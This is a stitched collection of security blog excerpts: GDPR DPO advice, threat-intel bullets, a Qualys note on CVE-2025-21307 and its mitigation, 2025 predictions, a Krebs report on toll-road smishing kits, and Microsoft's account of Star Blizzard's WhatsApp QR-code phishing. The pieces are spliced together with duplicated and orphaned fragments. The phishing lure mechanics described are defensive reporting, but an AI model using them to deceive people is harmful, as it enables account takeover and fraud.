&lt;h2 class="wp-block-heading" id="Guiding-others-towards-compliance"&gt;Guiding others towards compliance&lt;/h2&gt;



&lt;p&gt;Another key way in which the DPO (or privacy lead) can help give the organisation clarity into its data – and compliance – is by asking the right people the right questions.&lt;/p&gt;



&lt;p&gt;The DPO’s role isn’t to ‘do’ compliance themselves, but to &lt;em&gt;monitor&lt;/em&gt; compliance, as well as guide others – especially business line managers – in taking the right actions. So, ask questions around what personal data they’re processing, and why and how they’re processing it. You could also visualise this information in a &lt;a href="https://www.itgovernance.co.uk/gdpr-data-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow map&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Until you get clear answers to these questions, you won’t be able to get clarity on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Lawful basis&lt;/li&gt;



&lt;li&gt;The risks of processing&lt;/li&gt;



&lt;li&gt;Whether a DPIA is needed&lt;/li&gt;



&lt;li&gt;Necessary technical and organisational measures&lt;/li&gt;



&lt;li&gt;Information needed for your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The most reliable way to obtain all this information (and more!) – and ensure ongoing compliance – is to appoint a data privacy lead.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-breach-management"&gt;Data breach management&lt;/h2&gt;



&lt;p&gt;The value of having someone trained in data protection and privacy isn’t just apparent during business-as-usual times, when the DPO helps in the decision-making process through objective assessment and, where required, using tools like data flow maps and DPIAs.&lt;/p&gt;



&lt;p&gt;The DPO or privacy lead also plays a pivotal role if a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt; occurs. They can assess the risks, offer practical advice – including about what follow-up action is needed to contain and mitigate the breach – and report it to the ICO if required.&lt;/p&gt;



&lt;p&gt;To be effective in both business-as-usual matters and during business disruption, the DPO or privacy lead must secure the support of senior management – not just to have sufficient resources at their disposal, but to be able to introduce changes where needed.&lt;/p&gt;



&lt;p&gt;This includes implementing lessons learned following a data breach.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Knowledge-skills-and-competence"&gt;Knowledge, skills and competence&lt;/h2&gt;



&lt;p&gt;Experience will stand a DPO in good stead, but isn’t a substitute for competence.&lt;/p&gt;



&lt;p&gt;Apart from having a good grasp of the relevant regulations and excellent fact-checking abilities, a DPO will need to follow processes and be able to handle people well. Few people like change, so being able to convince them of the merits of those changes is an essential skill.&lt;/p&gt;



&lt;p&gt;As the DPO or privacy lead, you’ll be the go-to person, the ‘safe pair of hands’, the trusted adviser and the mediator. You’re not just going to be following procedures with care and caution – you’ll have a wide range of stakeholders to deal with.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/certified-data-protection-officer-c-dpo-training-course" rel="noreferrer noopener" target="_blank"&gt;Effective DPO training&lt;/a&gt; covers the ‘how to’ part of the role as well as the ‘what and when’.&lt;/p&gt;



&lt;p&gt;At IT Governance, we give guidance on what it means to be responsible and accountable in a DPO or data privacy leadership role. That’s what makes the difference between someone who has been handed a task and someone who is up to the job.&lt;/p&gt;



&lt;p&gt;And remember: how a person performs in their role ultimately determines their prospects and the commercial wellbeing of their organisation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://www.checkpoint.com/security-report/"&gt;published&lt;/a&gt; The State of Cyber Security 2025 report, highlighting a startling 44% rise in global cyberattacks from the previous year. The report uncovers the nature of modern cyber wars, evolving tactics of ransomware actors, rising tide of infostealers, increased targeting of edge devices and the new threats against cloud.&lt;/li&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/research/funksec-the-rising-yet-controversial-ransomware-threat-actor-dominating-december-2024/"&gt;released&lt;/a&gt; December 2024’s Most Wanted Malware report, highlighting the rise of FunkSec that emerged as a leading and controversial ransomware-as-a-service (RaaS) actor. Among top mobile malware threats, Anubis rises to the top, followed by Necro and Hydra. Anubis is a banking trojan, capable of keylogging and remote access.&lt;/li&gt;

The threat actors, who share overlaps with APT 28, use macro-embedded documents as the initial attack vector to deliver the HatVibe and CherrySpy backdoors.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation provides protection against this threat&lt;/em&gt; &lt;em&gt;(Trojan.Wins.HATVIBE.A) &lt;/em&gt; &lt;/p&gt;

With a CVSS score of 9.8, this vulnerability poses a severe threat and is highly susceptible to exploitation. What is CVE-2025-21307?

With a CVSS score of 9.8, this vulnerability poses a severe threat and is highly susceptible to exploitation.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="what-is-cve-2025-21307"&gt;&lt;strong&gt;What is CVE-2025-21307?&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;RMCAST is a kernel-level Windows component responsible for implementing reliable multicast communication. It specifically supports the Pragmatic General Multicast (PGM) protocol, which enables applications to send data packets simultaneously to multiple receivers while guaranteeing reliable, ordered delivery. The vulnerability allows an unauthenticated, remote attacker to execute arbitrary code on a vulnerable Windows system by sending specially crafted packets to a Windows PGM open socket. PGM is designed for reliable data transmission—commonly used in video streaming and financial data distribution—yet lacks inherent request authentication. This absence of authentication is central to the vulnerability.&lt;/p&gt;



&lt;p&gt;Successful exploitation requires a program that actively listens to a PGM port.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="deploying-the-patch-before-the-weekend"&gt;&lt;strong&gt;Deploying the Patch Before the Weekend&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;On Patch Tuesday, Microsoft released a patch to solve this vulnerability, and some organizations may have a mature Patch Tuesday process that allows them to deploy those patches to, usually, end-users&amp;#8217; machines; however, addressing this critical vulnerability on critical servers before the weekend is a different challenge altogether.&lt;/p&gt;



&lt;span id="more-37136"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="address-the-vulnerability-before-the-weekend-when-patching-is-not-an-option"&gt;&lt;strong&gt;Address the Vulnerability Before the Weekend When Patching is Not an Option&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;As every IT knows, deploying a Microsoft patch that involves kernel-level components will require a reboot of the server and may even break the application running on that server; hence, intensive testing is required. As such, for most organizations, deploying patches to servers is a long process that may take weeks and, unfortunately, in some cases, months.&lt;/p&gt;



&lt;p&gt;However, even though the business reasoning behind this long process of deploying patches to a production server is valid, bad actors see this as an opportunity to exploit those critical, unpatched vulnerabilities.&lt;/p&gt;



&lt;p&gt;In Qualys, our goal is to help our customers address risk efficiently while acknowledging that most organizations cannot deploy patches to production servers as soon as the patch is released – i.e., before the weekend. To help our customers address vulnerabilities before the weekend, without the risk involved in deploying a patch and rebooting a server, the &lt;a href="https://www.qualys.com/tru/"&gt;Qualys Threat Research Unit (TRU)&lt;/a&gt; researches critical vulnerabilities and &amp;nbsp;mitigation techniques that can be applied to reduce risk until a patch can be deployed. In most cases, those mitigation techniques introduce minimal operational risk and hence are “safer” to deploy immediately.&lt;/p&gt;



&lt;p&gt;CVE-2025-21307 is a good example. In this case, our TRU team suggests our customer choose from a few mitigation techniques that, in the right context, if applied to servers, will reduce the security risk with minimal operational risk to the servers. For example, one mitigation technique is to disable the MSMQ service if it is running. Customers can use the same Qualys agent to run a script written and tested by Qualys to disable this service and, as a result, mitigate CVE-2025-21307 until a patch can be deployed. As most servers do not need the MSMQ service, disabling it will cause no service disruption.&lt;/p&gt;

Amidst these challenges, progress emerged. The rise of new technologies like &lt;a href="https://blog.qualys.com/product-tech/2024/12/05/secure-your-generative-investments-qualys-advances-enterprise-trurisk-platform-with-qualys-totalai-to-protect-your-llm-investments"&gt;AI and LLM security&lt;/a&gt; and adoption of &lt;a href="https://blog.qualys.com/qualys-insights/2024/05/07/qualys-is-proud-to-sign-cisas-secure-by-design-pledge"&gt;government-designed protection standards&lt;/a&gt; provided a glimpse of what’s possible when we work together to make the digital world safer for everyone.&lt;/p&gt;



&lt;p&gt;As 2025 unfolds, the need for proactive, intelligence-driven strategies has never been more urgent. Nation-state attacks, AI misuse, and cloud security risks are poised to test the resilience of even the most prepared organizations. This blog draws on key predictions from the experts at Qualys to outline the cybersecurity trends expected to define the coming year.&lt;/p&gt;



&lt;span id="more-37127"&gt;&lt;/span&gt;

&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading" id="prediction-1-the-increasing-use-of-ai-will-not-alter-the-basics-of-cybersecurity-strategies"&gt;&lt;strong&gt;Prediction 1: The increasing use of AI will not alter the basics of cybersecurity strategies&lt;/strong&gt;&lt;/h2&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“While several enterprises are looking for the next best AI solution in an effort to fight fire with fire, I am reminded of the famous Alphonse Karr quote, &lt;em&gt;“The more things change, the more they stay the same.”&lt;/em&gt; As such, a better question is, “What do businesses stand to lose (i.e. what is the value at risk) from AI abuse and misuse?” And what portion of this risk can be addressed with current security capabilities? For example, is securing an AI agent from threats like spoofing, tampering, information disclosure, denial of service, escalation of privileges, actually novel? Does it require new investments to stand up a dedicated “AI” security stack? Similarly, consider that AI models consist of open source and first party code deployed on-premises, in the cloud, or both. Infrastructure, software pipeline, and supply chain security practices still apply. So again, the question is, do we really need a complete security rethink?&amp;nbsp;&lt;/p&gt;



&lt;p&gt;My recommendation is that security teams proactively address these evolving threats by developing robust threat models and establishing guardrails—essentially “secure by default” solutions. Ultimately, the key challenge lies in balancing the desire for rapid digital transformation with the imperative of safeguarding enterprise assets against potential AI-related abuses.”&lt;/p&gt;



&lt;p&gt;&amp;#8211;&lt;strong&gt;Richard Seiersen, Chief Risk Tech Officer, Qualys&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h2 class="wp-block-heading" id="prediction-2-securing-agentic-ai-will-be-yet-another-key-exposure-occurrence"&gt;&lt;strong&gt;Prediction 2: Securing Agentic AI will be yet another key exposure occurrence.&lt;/strong&gt;&lt;/h2&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“Agentic AI, AI that can autonomously make decisions and take actions, will become more prevalent in organizations. This will require additional privileged access. Since this is still an emerging field, security and privacy professionals will need to upgrade themselves to secure agentic AI end-to-end and ensure data is AI-ready.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;-Mayuresh Dani, Manager, Security Research for Qualys Threat Research Unit (TRU)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h2 class="wp-block-heading" id="prediction-3-cisos-will-double-down-on-risk-management-in-2025"&gt;&lt;strong&gt;Prediction 3: CISOs will double down on risk management in 2025.&lt;/strong&gt;&lt;/h2&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&amp;#8220;CISOs will double&amp;nbsp;down on risk management in 2025. Adopting this approach will allow them to operationally focus on the biggest risks to their business while quantifying the financial implications. This will allow them to justify investments in the right controls and offset the residual risks with appropriate insurance premiums.&lt;/p&gt;



&lt;p&gt;Additionally, the digital acceleration in every business is driving requirements for a more dynamic skills mix. Cloud security operations will continue to be a huge focus in the coming year to support this drive. Recruiting from adjacent departments to fill gaps will be a major focus to reduce the skills gaps seen in 2024.&amp;#8221;&lt;/p&gt;



&lt;p&gt;&amp;#8211;&lt;strong&gt;Matt Middleton-Leal, Managing Director, EMEA North, Qualys&lt;/strong&gt;&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="prediction-4-the-drive-for-consolidating-security-capabilities-will-increase-with-a-view-to-leveraging-unified-security-platforms"&gt;&lt;strong&gt;Prediction 4: The drive for consolidating security capabilities will increase, with a view to leveraging unified security platforms.&lt;/strong&gt;&lt;/h2&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“Consolidation of security capabilities has been on the agenda of many organizations for a while, and this will only continue to increase in 2025. And now, organizations are increasingly moving towards a unified platform approach that can provide both a centralized view of risk across the organization, and mechanisms to remediate that risk when found. This has primarily been driven by a need to reduce complexity, increase operational efficiency, enhance detection and response capabilities, and reduce overall cost.&lt;/p&gt;



&lt;p&gt;A unified platform is not a single solution that does everything but is one that provides a strong set of core capabilities, with a well-integrated partner ecosystem of additional capabilities that provide additional context. A well-integrated security platform that allows organizations to discover, prioritize and remediate critical business risk will serve to eliminate the challenges of complexity, inefficiency and increasing cost of ownership, while allowing businesses to focus on what matters most to them.”&lt;/p&gt;

&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“The 2025 rollout of CISA’s FOCAL Plan will emphasize improved asset management and vulnerability lifecycle management. Federal agencies will aim to adopt solutions that continuously identify assets and vulnerabilities, correlate asset contexts, and accurately prioritize risks using threat intelligence. Integrated patch remediation will be crucial in reducing both Mean Time to Detection (MTTD) and Mean Time to Remediation (MTTR), thereby enhancing overall cybersecurity resilience.”&lt;/p&gt;

&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“Nation-state attacks and cloud-based compromises with extremely long dwell times will continue to emerge at an increasing rate with large scale impact as security catches up with post-Covid and digital transformation efforts from the last few years, where adversaries are increasingly able to maintain ‘stealth for survival’.&lt;/p&gt;



&lt;p&gt;Beyond that, complex DevSecOps, API, and integrated cloud solutions will emerge as one of the leading threats as an attack vector for significant impact. We’re also going to see more accidental disclosure and insider threat risks for exfiltration, and challenges with preventing data leakage, due to how companies are still adopting technology without adequate security controls and architecture in place.&lt;/p&gt;



&lt;p&gt;Recovery from incident and breach will become increasingly difficult and take longer for organizations as adversaries become efficient at destroying backups and other resiliency measures that are in place, in an attempt to improve extortion payouts.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;-Ken Dunham, Director, Cyber Threat for Qualys TRU&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h2 class="wp-block-heading" id="the-roadmap"&gt;&lt;strong&gt;The Roadmap&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;In 2025, cybersecurity stands at the intersection of escalating threats and transformative technologies. The insights shared by our cybersecurity experts highlight a pivotal truth: the foundation of effective security lies in balancing innovation with robust risk management practices.&lt;/p&gt;

Researchers say the surge in SMS spam coincides with new features added to a popular commercial phishing kit sold in China that makes it simple to set up convincing lures spoofing toll road operators in multiple U.S. states.&lt;/p&gt;
&lt;p&gt;Last week, the &lt;strong&gt;Massachusetts Department of Transportation&lt;/strong&gt; (MassDOT) &lt;a href="https://www.ezdrivema.com/About-EzdriveMA/Smishing-Alert" rel="noopener" target="_blank"&gt;warned residents&lt;/a&gt; to be on the lookout for a new SMS phishing or &amp;#8220;smishing&amp;#8221; scam targeting users of &lt;strong&gt;EZDriveMA&lt;/strong&gt;, MassDOT&amp;#8217;s all electronic tolling program. Those who fall for the scam are asked to provide payment card data, and eventually will be asked to supply a one-time password sent via SMS or a mobile authentication app.&lt;/p&gt;
&lt;p&gt;Reports of similar SMS phishing attacks against customers of other U.S. state-run toll facilities surfaced around the same time as the MassDOT alert. People in Florida reported receiving SMS phishing that spoofed &lt;strong&gt;Sunpass&lt;/strong&gt;, Florida&amp;#8217;s prepaid toll program.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70096" style="width: 503px;"&gt;&lt;img alt="" class="size-full wp-image-70096" height="683" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/lighthouse-ezdrive.png" width="493" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70096"&gt;This phishing module for spoofing MassDOT&amp;#8217;s EZDrive toll system was offered on Jan. 10, 2025 by a China-based SMS phishing service called &amp;#8220;Lighthouse.&amp;#8221;&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In Texas, residents said they received text messages about unpaid tolls with the &lt;strong&gt;North Texas Toll Authority&lt;/strong&gt;. Similar reports came from readers in California, Colorado, Connecticut, Minnesota, and Washington. This is by no means a comprehensive list.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70097" style="width: 503px;"&gt;&lt;img alt="" class="size-full wp-image-70097" height="683" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/lighthouse-ntta.png" width="493" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70097"&gt;A new module from the Lighthouse SMS phishing kit released Jan. 14 targets customers of the North Texas Toll Authority (NTTA).&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In each case, the emergence of these SMS phishing attacks coincided with the release of new phishing kit capabilities that closely mimic these toll operator websites as they appear on mobile devices. Notably, none of the phishing pages will even load unless the website detects that the visitor is coming from a mobile device.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ford Merrill&lt;/strong&gt; works in security research at &lt;a href="https://www.secalliance.com" rel="noopener" target="_blank"&gt;SecAlliance&lt;/a&gt;, a &lt;a href="https://www.csis.com" rel="noopener" target="_blank"&gt;CSIS Security Group&lt;/a&gt; company. Merrill said the volume of SMS phishing attacks spoofing toll road operators skyrocketed after the New Year, when at least one Chinese cybercriminal group known for selling sophisticated SMS phishing kits began offering new phishing pages designed to spoof toll operators in various U.S. states.&lt;/p&gt;
&lt;p&gt;According to Merrill, multiple China-based cybercriminals are selling distinct SMS-based phishing kits that each have hundreds or thousands of customers. The ultimate goal of these kits, he said, is to phish enough information from victims that their payment cards can be added to mobile wallets and used to buy goods at physical stores, online, or to launder money through shell companies.&lt;span id="more-70091"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70098" style="width: 503px;"&gt;&lt;img alt="" class="size-full wp-image-70098" height="683" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/lighthouse-tollroads.png" width="493" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70098"&gt;A component of the Chinese SMS phishing kit Lighthouse made to target customers of The Toll Roads, which refers to several state routes through Orange County, Calif.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Merrill said the different purveyors of these SMS phishing tools traditionally have impersonated shipping companies, customs authorities, and even governments with tax refund lures and visa or immigration renewal scams targeting people who may be living abroad or new to a country.&lt;/p&gt;
&lt;p&gt;&amp;#8220;What we&amp;#8217;re seeing with these tolls scams is just a continuation of the Chinese smishing groups rotating from package redelivery schemes to toll road scams,&amp;#8221; Merrill said. &amp;#8220;Every one of us by now is sick and tired of receiving these package smishing attacks, so now it&amp;#8217;s a new twist on an existing scam.”&lt;/p&gt;
&lt;p&gt;In October 2023, KrebsOnSecurity wrote about &lt;a href="https://krebsonsecurity.com/2023/10/phishers-spoof-usps-12-other-natl-postal-services/" rel="noopener" target="_blank"&gt;a massive uptick in SMS phishing scams targeting &lt;strong&gt;U.S. Postal Service&lt;/strong&gt; customers&lt;/a&gt;. That story revealed the surge was tied to innovations introduced by &amp;#8220;&lt;strong&gt;Chenlun&lt;/strong&gt;,&amp;#8221; a mainland China-based proprietor of a popular phishing kit and service. At the time, Chenlun had just introduced new phishing pages made to impersonate postal services in the United States and at least a dozen other countries.&lt;/p&gt;
&lt;p&gt;SMS phishing kits are hardly new, but Merrill said Chinese smishing groups recently have introduced innovations in deliverability, by more seamlessly integrating their spam messages with Apple&amp;#8217;s &lt;strong&gt;iMessage&lt;/strong&gt; technology, and with &lt;a href="https://support.google.com/messages/answer/7189714?hl=en" rel="noopener" target="_blank"&gt;RCS&lt;/a&gt;, the equivalent &amp;#8220;rich text&amp;#8221; messaging capability built into &lt;strong&gt;Android&lt;/strong&gt; devices.&lt;/p&gt;
&lt;p&gt;“While traditional smishing kits relied heavily on SMS for delivery, nowadays the actors make heavy use of iMessage and RCS because telecom operators can’t filter them and they likely have a higher success rate with these delivery channels,” he said.&lt;/p&gt;
&lt;p&gt;It remains unclear how the phishers have selected their targets, or from where their data may be sourced. A notice from MassDOT cautions that &amp;#8220;the targeted phone numbers seem to be chosen at random and are not uniquely associated with an account or usage of toll roads.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Indeed, one reader shared on Mastodon yesterday that they&amp;#8217;d received one of these SMS phishing attacks spoofing a local toll operator, when they didn&amp;#8217;t even own a vehicle.&lt;/p&gt;
&lt;p&gt;Targeted or not, these phishing websites are dangerous because they are operated dynamically in real-time by criminals. If you receive one of these messages, just ignore it or delete it, but please do not visit the phishing site. The FBI asks that before you bin the missives, consider filing a complaint with the agency&amp;#8217;s &lt;a href="https://www.ic3.gov" rel="noopener" target="_blank"&gt;Internet Crime Complaint Center&lt;/a&gt; (IC3), including the phone number where the text originated, and the website listed within the text.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70091</guid><category>A Little Sunshine</category><category>Latest Warnings</category><category>Web Fraud 2.0</category><category>@chenlun</category><category>CSIS Security Group</category><category>EZDriveMA</category><category>fbi</category><category>Ford Merrill</category><category>ic3</category><category>iMessage</category><category>Lighthouse</category><category>MassDOT</category><category>North Texas Toll Authority</category><category>RCS</category><category>SecAlliance</category><category>smishing</category><category>SMS phishing</category><category>Sunpass</category><category>The Toll Roads</category></item><item><title>New Star Blizzard spear-phishing campaign targets WhatsApp accounts</title><link>https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/</link><description>&lt;p&gt;In mid-November 2024, Microsoft Threat Intelligence observed the Russian threat actor we track as Star Blizzard sending their typical targets spear-phishing messages, this time offering the supposed opportunity to join a WhatsApp group.

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/"&gt;New Star Blizzard spear-phishing campaign targets WhatsApp accounts&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;In mid-November 2024, Microsoft Threat Intelligence observed the Russian threat actor we track as Star Blizzard sending their typical targets spear-phishing messages, this time offering the supposed opportunity to join a WhatsApp group. This is the first time we have identified a shift in Star Blizzard’s longstanding tactics, techniques, and procedures (TTPs) to leverage a new access vector. Star Blizzard’s targets are most commonly related to government or diplomacy (both incumbent and former position holders), defense policy or international relations researchers whose work touches on Russia, and sources of&amp;nbsp;assistance to Ukraine related to the war with Russia.&lt;/p&gt;



&lt;p&gt;In our last blog post about &lt;a href="https://www.microsoft.com/security/blog/2023/12/07/star-blizzard-increases-sophistication-and-evasion-in-ongoing-attacks/"&gt;Star Blizzard&lt;/a&gt;, we discussed how the threat actor targeted dozens of civil society organizations—journalists, think tanks, and non-governmental organizations (NGOs)—between January 2023 and August 2024 by deploying spear-phishing campaigns to exfiltrate sensitive information and interfere in their activities. Since October 3, 2024, Microsoft and the US Department of Justice have seized or taken down more than 180 websites related to that activity. While this coordinated action had a short-term impact on Star Blizzard’s phishing operations, we noted at the time that after this threat actor’s active infrastructure was exposed, they swiftly transitioned to new domains to continue their operations, indicating that the threat actor is highly resilient to operational disruptions.&lt;/p&gt;



&lt;p&gt;We assess the threat actor’s shift to compromising WhatsApp accounts is likely in response to the exposure of their TTPs by Microsoft Threat Intelligence and other organizations, including national cybersecurity agencies. While this campaign appears to have wound down at the end of November, we are highlighting the new shift as a sign that the threat actor could be seeking to change its TTPs in order to evade detection.&lt;/p&gt;



&lt;p&gt;As part of our continuous monitoring, analysis, and reporting on the threat landscape, we are sharing our information on Star Blizzard’s latest activity to raise awareness of this threat actor’s shift in tradecraft and to educate organizations on how to harden their attack surfaces against this and similar activity. We also directly notify customers who have been targeted or compromised, providing them with the necessary information to help secure their environments.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="targeting-whatsapp-account-data"&gt;Targeting WhatsApp account data&lt;/h2&gt;



&lt;p&gt;Star Blizzard’s new spear-phishing campaign, while novel in that it uses and targets WhatsApp for the first time, exhibits familiar spear-phishing TTPs for Star Blizzard, with the threat actor initiating email contact with their targets, to engage them, before sending them a second message containing a malicious link. The sender address used by the threat actor in this campaign impersonates a US government official, continuing Star Blizzard’s practice of impersonating known political/diplomatic figures, to further ensure target engagement. The initial email sent to targets contains a quick response (QR) code purporting to direct users to join a WhatsApp group on &amp;#8220;the latest non-governmental initiatives aimed at supporting Ukraine NGOs.” This code, however, is intentionally broken and will not direct the user towards any valid domain; this is an effort to coax the target recipient into responding.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of an email with a redacted QR code at the bottom. It states &amp;quot;Dear redacted, I hope this message finds you well. We have established a private WhatsApp group to facilitate discussions regarding the latest non-governmental initiatives aimed at supporting Ukraine. This platform will also serve as a means to coordinate the distribution of government-allocated funds for 
this purpose. You can join using this QR code below:&amp;quot;" class="wp-image-137135 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/Figure-1.-Star-Blizzard-initial-spear-phishing-email-with-broken-QR-code-4.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. Star Blizzard initial spear-phishing email with broken QR code&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;When the recipient responds, Star Blizzard sends a second email containing a Safe Links-wrapped &lt;em&gt;t[.]ly&lt;/em&gt;&amp;nbsp;shortened link as the alternative link to join the WhatsApp group.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of an email that states &amp;quot;Redacted, I apologize for the inconvenience with the QR code. Kindly try this alternative link. It should work without any issues.&amp;quot; The link in the email is labeled US-Ukraine NGOs Group" class="wp-image-137098 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/Figure-2.-Star-Blizzard-follow-on-spear-phishing-email-with-URL-link.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. Star Blizzard follow-on spear-phishing email with URL link&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;When this link is followed, the target is redirected to a webpage asking them to scan a QR code to join the group. However, this QR code is actually used by WhatsApp to connect an account to a linked device and/or the WhatsApp Web portal. This means that if the target follows the instructions on this page, the threat actor can gain access to the messages in their WhatsApp account and have the capability to exfiltrate this data using existing browser plugins, which are designed for exporting WhatsApp messages from an account accessed via WhatsApp Web.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the phish attempt displaying a legitimate WhatsApp webpage called To join the US-Ukraine NGOs Group, followed by instructions directing the user to scan the redacted QR code to link their device. " class="wp-image-137099 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/Figure-3.-Malicious-Star-Blizzard-phish-attempt-using-WhatsApp-linking-QR-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3. Malicious Star Blizzard phish attempt using WhatsApp linking QR code&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;While this campaign was limited and appeared to have terminated at the end of November, it nevertheless marked a break in long-standing Star Blizzard TTPs and highlighted the threat actor’s tenacity in continuing spear-phishing campaigns to gain access to sensitive information even in the face of repeated degradations of their operations.&lt;/p&gt;



&lt;p&gt;Microsoft Threat Intelligence recommends that all email users belonging to sectors that Star Blizzard typically targets always remain vigilant when dealing with email, especially emails containing links to external resources. These targets are most commonly related to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Government or diplomacy (incumbent and former position holders)&lt;/li&gt;



&lt;li&gt;Research into defense policy or international relations when related to Russia&lt;/li&gt;



&lt;li&gt;Assistance to Ukraine related to the ongoing conflict with Russia&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;When in doubt, contact the person you think is sending the email using a known and previously used email address to verify that the email was indeed sent by them.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="mitigations"&gt;Mitigations&lt;/h2&gt;



&lt;p&gt;To harden networks against the Star Blizzard activity listed above, defenders can implement the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Implement &lt;a href="https://learn.microsoft.com/defender-endpoint/"&gt;Microsoft Defender for Endpoint&lt;/a&gt; on Android and iOS, which includes anti-phishing capabilities that also apply to QR code phishing attacks, blocking phishing sites from being accessed. &lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/enable-network-protection"&gt;Enable network protection&lt;/a&gt; in Microsoft Defender for Endpoint&lt;/li&gt;



&lt;li&gt;Ensure that &lt;a href="https://learn.microsoft.com/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection"&gt;tamper protection&lt;/a&gt; is enabled in Microsoft Dender for Endpoint&lt;/li&gt;



&lt;li&gt;Run endpoint detection and response in &lt;a href="https://learn.microsoft.com/defender-endpoint/edr-in-block-mode"&gt;block mode&lt;/a&gt; so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode.&lt;/li&gt;



&lt;li&gt;Configure &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/automated-investigations"&gt;investigation and remediation&lt;/a&gt; in full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume.&lt;/li&gt;



